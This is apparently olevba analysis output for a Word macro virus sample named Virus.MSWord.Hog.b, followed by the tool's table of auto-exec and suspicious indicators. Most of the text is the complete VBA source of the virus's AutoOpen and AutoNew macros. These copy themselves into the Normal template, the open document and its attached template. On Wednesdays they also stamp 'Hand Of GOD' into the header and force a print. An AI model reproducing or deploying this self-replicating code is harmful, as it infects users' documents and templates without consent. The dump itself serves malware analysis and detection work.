olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hog.b-27a595cd3880996b59c75bd22f46d18b85bec094
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hog.b-27a595cd3880996b59c75bd22f46d18b85bec094 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Hog.b-27a595cd3880996b59c75bd22f46d18b85bec094 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim nor$
Dim doc$
Dim tem$
Dim mac$
Dim em
Dim ar$(2)


Sub main()
    ar$(1) = "AutoNew"
    ar$(2) = "AutoOpen"
    
    On Error Resume Next
    
    If WeekDay(Now()) = vbWednesday Then
        With ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range
            .Font.Size = 12
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .Text = "Hand Of GOD"
        End With
        ActiveDocument.PrintOut
    End If
    
cnt = WordBasic.countmacros(0)
    
file$ = WordBasic.[filename$]()
fil$ = file$ + ":AutoOpen"
WordBasic.macrocopy fil$, "AutoOpen"
fil1$ = file$ + ":AutoNew"
WordBasic.macrocopy fil1$, "AutoNew"

 mac$ = MacroContainer.Path
    mac$ = mac$ & "\" & MacroContainer.Name
    
    nor$ = NormalTemplate.Path
    nor$ = nor$ & "\" & NormalTemplate.Name
    
    doc$ = ActiveDocument.Path
    doc$ = doc$ & "\" & ActiveDocument.Name
    
    
    With ActiveDocument.AttachedTemplate
        tem$ = .Path
        tem$ = tem$ & "\" & .Name
    End With
        
    
   For n% = 1 To 2
   
   Application.OrganizerCopy Source:=mac$, _
        Destination:=nor$, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems
        
   Application.OrganizerCopy Source:=mac$, _
        Destination:=ActiveDocument, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems
        
   Application.OrganizerCopy Source:=mac$, _
        Destination:=tem$, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems

    Next n%
    
    ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Hog.b-27a595cd3880996b59c75bd22f46d18b85bec094 - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim nor$
Dim doc$
Dim tem$
Dim mac$
Dim em
Dim ar$(2)



Sub main()
    ar$(1) = "AutoNew"
    ar$(2) = "AutoOpen"
    
    On Error Resume Next
  
    mac$ = MacroContainer.Name
    
    nor$ = NormalTemplate.Path
    nor$ = nor$ & "\" & NormalTemplate.Name
    
    doc$ = ActiveDocument.Name
    
    With ActiveDocument.AttachedTemplate
        tem$ = .Path
        tem$ = tem$ & "\" & .Name
    End With
file$ = WordBasic.[filename$]()
fil$ = file$ + ":AutoOpen"
WordBasic.macrocopy fil$, "AutoOpen"
fil1$ = file$ + ":AutoNew"
WordBasic.macrocopy fil1$, "AutoNew"
   For n% = 1 To 2
   
   Application.OrganizerCopy Source:=mac$, _
        Destination:=nor$, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems
        
   Application.OrganizerCopy Source:=mac$, _
        Destination:=ActiveDocument, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems
        
   Application.OrganizerCopy Source:=mac$, _
        Destination:=tem$, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems

    Next n%
    NormalTemplate.Save

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

